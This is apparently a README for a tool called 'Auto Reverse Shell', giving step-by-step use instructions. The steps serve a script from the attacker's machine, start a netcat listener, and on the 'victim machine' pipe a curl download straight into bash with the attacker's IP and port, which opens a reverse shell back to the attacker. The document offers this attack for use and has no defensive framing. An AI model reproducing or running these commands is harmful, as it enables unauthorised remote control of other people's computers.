# Auto Reverse Shell 🐙

## Use 💻
1. Download rshells.sh on the attacker's machine
2. Serve it with a web server, for example `python3 -m http.server 80`
3. Run netcat in another terminal to listen on some port, for example port 443: `nc -nlvp 443`
4. On the victim machine run: `curl http://<IpWebServer>:<PortWebServer>/rshell.sh | bash -s <AttackerIP> <NetcatPort>`
5. Look at the netcat terminal and you will see the shell of the victim.